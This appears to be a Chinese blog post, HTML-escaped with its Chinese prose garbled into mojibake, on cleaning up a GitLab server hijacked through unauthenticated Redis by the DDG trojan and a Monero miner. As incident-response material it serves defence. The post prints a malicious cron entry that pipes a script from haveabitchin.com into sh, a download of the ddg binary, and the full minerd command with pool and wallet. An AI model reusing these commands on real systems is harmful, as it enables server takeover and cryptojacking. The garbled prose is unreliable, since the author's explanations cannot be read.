&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_01.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_02.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;ç¬¬ä¸€æ—¶é—´æˆ‘æŸ¥çœ‹ä»€ä¹ˆåŸå› å¯¼è‡´æˆ‘gitlab-500ã€‚&quot;&gt;&lt;a href=&quot;#ç¬¬ä¸€æ—¶é—´æˆ‘æŸ¥çœ‹ä»€ä¹ˆåŸå› å¯¼è‡´æˆ‘gitlab-500ã€‚&quot; class=&quot;headerlink&quot; title=&quot;ç¬¬ä¸€æ—¶é—´æˆ‘æŸ¥çœ‹ä»€ä¹ˆåŸå› å¯¼è‡´æˆ‘gitlab 500ã€‚&quot;&gt;&lt;/a&gt;ç¬¬ä¸€æ—¶é—´æˆ‘æŸ¥çœ‹ä»€ä¹ˆåŸå› å¯¼è‡´æˆ‘gitlab 500ã€‚&lt;/h4&gt;&lt;p&gt;æ ¹æ®ä»¥å¾€ç»éªŒgitlabå‡ºç°500 ç¬¬ä¸€ï¼šç‰ˆæœ¬å‡ºç°bugï¼Œç¬¬äºŒï¼šæœåŠ¡å™¨ç½‘ç»œä¸æ­£å¸¸ï¼Œè¯·æ±‚ä¸åˆ°ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åæŸ¥çœ‹æ—¥å¿—ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@GitLab ~]&lt;span class=&quot;comment&quot;&gt;# tailf -1000 /home/git/gitlab/log/production.log&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Started POST &lt;span class=&quot;string&quot;&gt;&quot;//api/v3/internal/allowed&quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; 139.129.22.17 at 2017-01-06 10:14:26 +0800&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Started POST &lt;span class=&quot;string&quot;&gt;&quot;//api/v3/internal/allowed&quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; 139.129.22.17 at 2017-01-06 10:14:31 +0800&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Started POST &lt;span class=&quot;string&quot;&gt;&quot;//api/v3/internal/allowed&quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; 139.129.22.17 at 2017-01-06 10:14:37 +0800&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Started POST &lt;span class=&quot;string&quot;&gt;&quot;//api/v3/internal/allowed&quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; 139.129.22.17 at 2017-01-06 10:14:42 +0800&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Started POST &lt;span class=&quot;string&quot;&gt;&quot;//api/v3/internal/allowed&quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; 139.129.22.17 at 2017-01-06 10:15:35 +0800&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Started GET &lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; 177.154.56.233 at 2017-01-06 10:15:55 +0800&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Processing by DashboardController&lt;span class=&quot;comment&quot;&gt;#show as */*&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Completed 401 Unauthorized &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; 55ms&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Redis::CommandError (NOAUTH Authentication required.):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  config/initializers/redis-store-fix-expiry.rb:10:&lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; `block &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; setex&lt;span class=&quot;string&quot;&gt;&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  config/initializers/redis-store-fix-expiry.rb:10:in `setterâ€™&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;è¿™é‡Œæç¤ºRediséœ€è¦è®¤è¯ï¼Œ&lt;code&gt;Redis::CommandError (NOAUTH Authentication required.)&lt;/code&gt;:è¿™é‡Œå½“åˆå°±æ²¡æœ‰è®¤è¯çš„ï¼Œçªç„¶éœ€è¦è®¤è¯ï¼Œæ˜æ˜¾è¢«äººé»‘äº†ã€‚&lt;/p&gt;
&lt;p&gt;å› ä¸ºredisæœåŠ¡åœ¨2016å¹´3æœˆä»½å®˜ç½‘å‘å¸ƒäº†ä¸€é¡¹é€šçŸ¥ï¼šä½¿ç”¨redisä¸»è¦è®¾ç½®å¯†ç ã€‚&lt;br&gt;å¯ä»¥çœ‹ä¸‹è¿™ç¯‡æ–‡ç« ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.oschina.net/news/67975/redis-defect?from=mail-notify&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Redis æœªæˆæƒè®¿é—®ç¼ºé™·å¯è½»æ˜“å¯¼è‡´ç³»ç»Ÿè¢«é»‘&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å…¨çƒæ— éªŒè¯å¯ç›´æ¥åˆ©ç”¨ Redis TOP 10 å›½å®¶ä¸åœ°åŒº&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://static.oschina.net/uploads/space/2015/1112/131046_hoNL_865233.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;è§£å†³æ–¹æ¡ˆ&lt;/p&gt;
&lt;figure class=&quot;highlight mipsasm&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;ä¸´æ—¶è§£å†³æ–¹æ¡ˆ                            &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;é…ç½®&lt;span class=&quot;keyword&quot;&gt;bindé€‰é¡¹, &lt;/span&gt;é™å®šå¯ä»¥è¿æ¥RedisæœåŠ¡å™¨çš„IP, å¹¶ä¿®æ”¹redisçš„é»˜è®¤ç«¯å£&lt;span class=&quot;number&quot;&gt;6379&lt;/span&gt;.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;é…ç½®AUTH, è®¾ç½®å¯†ç , å¯†ç ä¼šä»¥æ˜æ–‡æ–¹å¼ä¿å­˜åœ¨redisé…ç½®æ–‡ä»¶ä¸­.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;é…ç½®rename-command &lt;span class=&quot;built_in&quot;&gt;CONFIG&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;RENAME_CONFIG&quot;&lt;/span&gt;, è¿™æ ·å³ä½¿å­˜åœ¨æœªæˆæƒè®¿é—®, ä¹Ÿèƒ½å¤Ÿç»™æ”»å‡»è€…ä½¿ç”¨&lt;span class=&quot;built_in&quot;&gt;config&lt;/span&gt;æŒ‡ä»¤åŠ å¤§éš¾åº¦&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;å¥½æ¶ˆæ¯æ˜¯Redisä½œè€…è¡¨ç¤ºå°†ä¼šå¼€å‘â€real userâ€ï¼ŒåŒºåˆ†æ™®é€šç”¨æˆ·å’Œadminæƒé™ï¼Œæ™®é€šç”¨æˆ·å°†ä¼šè¢«ç¦æ­¢è¿è¡ŒæŸäº›å‘½ä»¤ï¼Œå¦‚&lt;span class=&quot;built_in&quot;&gt;config&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;å®˜æ–¹è§£å†³æ–¹æ¡ˆ                            &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æš‚æ— å®˜æ–¹è§£å†³æ–¹æ¡ˆ&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ç°åœ¨ç‰ˆæœ¬gitlab 7.0ç‰ˆæœ¬çš„æ²¡æœ‰redisè®¾ç½®å¯†ç ä¸€é¡¹ï¼Œæ‰€ä»¥å°±è§‰å¾—å¥‡æ€ªï¼Œä¸ºä»€ä¹ˆä¼šæœ‰äººè®¾ç½®äº†å¯†ç ï¼Œç½‘ç«™å¯¼è‡´è·å–ä¸åˆ°æ•°æ®å°±å‡ºç°500äº†ã€‚&lt;/p&gt;
&lt;h4 id=&quot;æŸ¥æ‰¾åŸå› ï¼šä»€ä¹ˆåŸå› å¯¼è‡´CPUä¸€ç›´100&quot;&gt;&lt;a href=&quot;#æŸ¥æ‰¾åŸå› ï¼šä»€ä¹ˆåŸå› å¯¼è‡´CPUä¸€ç›´100&quot; class=&quot;headerlink&quot; title=&quot;æŸ¥æ‰¾åŸå› ï¼šä»€ä¹ˆåŸå› å¯¼è‡´CPUä¸€ç›´100%&quot;&gt;&lt;/a&gt;æŸ¥æ‰¾åŸå› ï¼šä»€ä¹ˆåŸå› å¯¼è‡´CPUä¸€ç›´100%&lt;/h4&gt;&lt;p&gt;é¦–å…ˆSSHç™»é™†ï¼ŒtopæŸ¥çœ‹è¿›ç¨‹ï¼Œå‘ç°å¥‡æ€ªåå­—çš„å‘½ä»¤AnXqV, ddg.217éšè—è¿›ç¨‹ã€‚ è¿˜æœ‰ä¸€çœ‹å°±æ„Ÿè§‰æœ‰é—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_03.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;çŸ¥é“è¿™ä¸ªè¿›ç¨‹ç„¶åæˆ‘ä»¬å•ç‹¬çœ‹ä¸‹è¿™ä¸ªè¿›ç¨‹å…·ä½“æœ‰å“ªäº›ï¼š&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_04.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;lsof â€“c ddg.217&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æŸ¥çœ‹å…³è”æ–‡ä»¶ï¼Œå‘ç°å¯¹å¤–çš„tcpè¿æ¥ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯åå‘shellâ€¦&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_05.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ä»è¿™é‡Œæ˜æ˜¾å¯ä»¥çœ‹çš„å‡ºæ¥ï¼Œæˆ‘çš„redis-6379 è¢«äººæ‹¿åˆ°shellæƒé™äº†ã€‚&lt;/p&gt;
&lt;p&gt;ä»ä¸Šé¢å¯ä»¥çœ‹åˆ°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_06.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæˆ‘åˆ°/root/.ddg/17.dbè¿™ä¸ªæ–‡ä»¶æˆ‘æ‰“å¼€çœ‹æ˜¯ä¹±ç åŠ å¯†è¿‡çš„ã€‚&lt;br&gt;åŠ å¯†çš„ çœ‹ä¸åˆ°æ•°æ®ã€‚&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_07.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h6 id=&quot;è¿™é‡Œç¬¬ä¸€æ­¥åˆ é™¤ç¬¬ä¸€ä¸ªç—…æ¯’æ–‡ä»¶å’ŒåŠ æƒé™ä½ï¼š&quot;&gt;&lt;a href=&quot;#è¿™é‡Œç¬¬ä¸€æ­¥åˆ é™¤ç¬¬ä¸€ä¸ªç—…æ¯’æ–‡ä»¶å’ŒåŠ æƒé™ä½ï¼š&quot; class=&quot;headerlink&quot; title=&quot;è¿™é‡Œç¬¬ä¸€æ­¥åˆ é™¤ç¬¬ä¸€ä¸ªç—…æ¯’æ–‡ä»¶å’ŒåŠ æƒé™ä½ï¼š&quot;&gt;&lt;/a&gt;è¿™é‡Œç¬¬ä¸€æ­¥åˆ é™¤ç¬¬ä¸€ä¸ªç—…æ¯’æ–‡ä»¶å’ŒåŠ æƒé™ä½ï¼š&lt;/h6&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;rm -rf /root/.ddg  åˆ é™¤ä¾èµ–ã€‚ä»–ä¾èµ–äºå“ªä¸ªæ–‡ä»¶ï¼Œç„¶åç»™åŠ ä¸€ä¸ªæƒé™ä½ï¼šchattr  +s  filename&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;åˆ é™¤æ‰äº† ä½ æ‰‹åŠ¨åˆ›å»ºï¼Œç„¶ååŠ æƒé™ä½ã€‚&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h6 id=&quot;ç¬¬äºŒæ­¥åˆ†æä¸‹é¢IPåœ°å€ï¼š&quot;&gt;&lt;a href=&quot;#ç¬¬äºŒæ­¥åˆ†æä¸‹é¢IPåœ°å€ï¼š&quot; class=&quot;headerlink&quot; title=&quot;ç¬¬äºŒæ­¥åˆ†æä¸‹é¢IPåœ°å€ï¼š&quot;&gt;&lt;/a&gt;ç¬¬äºŒæ­¥åˆ†æä¸‹é¢IPåœ°å€ï¼š&lt;/h6&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;139.222.173.127&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;139.70.199.90&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.....&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;åé¢å°±ä¸ç”¨è§£é‡Šäº†ï¼Œè¿™ä¸ªæ˜æ˜¾å½“`è‚‰é¸¡`äº†ã€‚&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_08.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ä¸´æ—¶æ–¹æ³•é˜²ç«å¢™é…ç½®å±è”½è¿™äº›IPåœ°å€ã€‚ æ²»æ ‡ä¸æ²»æœ¬ã€&lt;/p&gt;
&lt;p&gt;è¿™é‡Œè§£å†³æ‰&lt;code&gt;12506&lt;/code&gt;è¿›ç¨‹ï¼škill -9 12506&lt;/p&gt;
&lt;p&gt;é…ç½® ä¸€ä¸ªhosts  &lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;10.0.1.110   www.haveabitchin.com  é…ç½®æˆ ç™¾åº¦çš„ip&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å¸®ä»–é…é”™åœ°å€,ä»–è‚¯å®šè¯·æ±‚ä¸‹è½½ ä¸åˆ°è¿™ä¸ªè„šæœ¬äº†.&lt;/p&gt;
&lt;p&gt;ç„¶åæŒ‰è¿›ç¨‹ç¨‹åºç›®å½•ä¸‹é¢è¿›å…¥/tmp/åˆ é™¤ ddg.217æ–‡ä»¶ï¼Œåˆ é™¤duchduckgo.17.log è¿™ä¸ªæ˜¯ç—…æ¯’è¿è¡Œè¿›ç¨‹è¾“å‡ºçš„æ—¥å¿—æ–‡ä»¶ï¼Œ&lt;br&gt;åˆ é™¤hsperfadata_root è¿™ä¸ªæ–‡ä»¶é‡Œé¢æ˜¯ä¸ªè¿›ç¨‹ï¼Œä¹Ÿåˆ é™¤ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_09.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶ååœ¨çœ‹çœ‹æ˜¯å¦è¿˜æœ‰æ²¡æœ‰è¿™ä¸ªè¿›ç¨‹ï¼š&lt;br&gt;åˆå¯åŠ¨&lt;code&gt;13929&lt;/code&gt;è¿™ä¸ªè¿›ç¨‹ï¼ŒæœåŠ¡è¿˜æ˜¯å ç”¨å¾ˆé«˜èµ„æºCPUï¼š100%&lt;br&gt;å®šä½åˆ°æ˜¯å“ªä¸ªç¨‹åº å‘èµ·çš„è¯·æ±‚.æŸ¥çœ‹ï¼š&lt;code&gt;13918&lt;/code&gt;è¿™ä¸ªè¿›ç¨‹ï¼š&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_10.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ä»è¿™é‡Œæ˜æ˜¾å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™ä¸ªåœ°å€ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight groovy&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;regexp&quot;&gt;/bin/&lt;/span&gt;sh -c curl -fsSL &lt;span class=&quot;string&quot;&gt;http:&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;//www.haveabitchin.com/pm.sh?0105008 | sh&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;curl -fsSL &lt;span class=&quot;string&quot;&gt;http:&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;//www.haveabitchin.com/ddg.x86_64 -o /tmp/ddg.217&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;è¿™ä¸ªæ˜æ˜¾æ˜¯å“ªä¸ªç¨‹åºä¸€ç›´åœ¨å¯åŠ¨ã€‚&lt;/p&gt;
&lt;h5 id=&quot;ç¬¬ä¸‰æ­¥ç»§ç»­æ’æŸ¥ï¼š&quot;&gt;&lt;a href=&quot;#ç¬¬ä¸‰æ­¥ç»§ç»­æ’æŸ¥ï¼š&quot; class=&quot;headerlink&quot; title=&quot;ç¬¬ä¸‰æ­¥ç»§ç»­æ’æŸ¥ï¼š&quot;&gt;&lt;/a&gt;ç¬¬ä¸‰æ­¥ç»§ç»­æ’æŸ¥ï¼š&lt;/h5&gt;&lt;p&gt;åˆ é™¤è¿™äº›å‘ç°è¿˜æ˜¯CPUç™¾åˆ†ç™¾ï¼š&lt;br&gt;åœ¨ç»§ç»­æŸ¥çœ‹è¿›ç¨‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_11.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;root     26373     1 96 Jan01 ?        4-12:14:03 ./minerd -B &lt;span class=&quot;_&quot;&gt;-a&lt;/span&gt; cryptonight -o stratum+tcp://xmr.crypto-pool.fr:80 -u 44GpQ3X9aCR5fMfD8myxKQcAYjkTdT5KrM4NM2rM9yWnEkP28mmXu5URUCxwuvKiVCQPZaoYkpxxzKoCpnED6Gmb2wWJRuN -p x&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_12.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªè¿›ç¨‹æ˜¯ä»€ä¹ˆï¼šmined ç™¾åº¦å‘Šè¯‰æˆ‘ä»¬äº†: &lt;a href=&quot;https://zhidao.baidu.com/question/1928020622935195267.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;minedè‚‰é¸¡æœ¨é©¬&lt;/a&gt; å¾ˆåƒCPUä¸€ç§ç—…æ¯’ã€‚&lt;/p&gt;
&lt;h5 id=&quot;ç¬¬ä¸€æ­¥è§£å†³å®šä½æœ¨é©¬ï¼š&quot;&gt;&lt;a href=&quot;#ç¬¬ä¸€æ­¥è§£å†³å®šä½æœ¨é©¬ï¼š&quot; class=&quot;headerlink&quot; title=&quot;ç¬¬ä¸€æ­¥è§£å†³å®šä½æœ¨é©¬ï¼š&quot;&gt;&lt;/a&gt;ç¬¬ä¸€æ­¥è§£å†³å®šä½æœ¨é©¬ï¼š&lt;/h5&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;find / -name minerd&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;åœ¨æœåŠ¡å™¨æœç´¢æ‰€æœ‰ç›¸å…³minerdæ–‡ä»¶ã€‚&lt;br&gt;æœç´¢åˆ°äº†è¿™ä¸ªæ–‡ä»¶æ”¾åœ¨æˆ‘ä»¬/home/ç›®å½•ä¸‹é¢ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_13.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h5 id=&quot;ç¬¬äºŒæ­¥åˆ é™¤æœ¨é©¬ï¼š&quot;&gt;&lt;a href=&quot;#ç¬¬äºŒæ­¥åˆ é™¤æœ¨é©¬ï¼š&quot; class=&quot;headerlink&quot; title=&quot;ç¬¬äºŒæ­¥åˆ é™¤æœ¨é©¬ï¼š&quot;&gt;&lt;/a&gt;ç¬¬äºŒæ­¥åˆ é™¤æœ¨é©¬ï¼š&lt;/h5&gt;&lt;p&gt;æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡æ˜¯å¦æœ‰å¯åŠ¨ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@GitLab tmp]&lt;span class=&quot;comment&quot;&gt;# cronte -e&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&quot;æœåŠ¡å™¨æ¢å¤æ­£å¸¸ï¼š&quot;&gt;&lt;a href=&quot;#æœåŠ¡å™¨æ¢å¤æ­£å¸¸ï¼š&quot; class=&quot;headerlink&quot; title=&quot;æœåŠ¡å™¨æ¢å¤æ­£å¸¸ï¼š&quot;&gt;&lt;/a&gt;æœåŠ¡å™¨æ¢å¤æ­£å¸¸ï¼š&lt;/h5&gt;&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_14.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘è¿™é‡Œå°±è´´å‡ºäº†è¿™ä¸ªæœ¨é©¬çš„è„šæœ¬å†…å®¹ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div 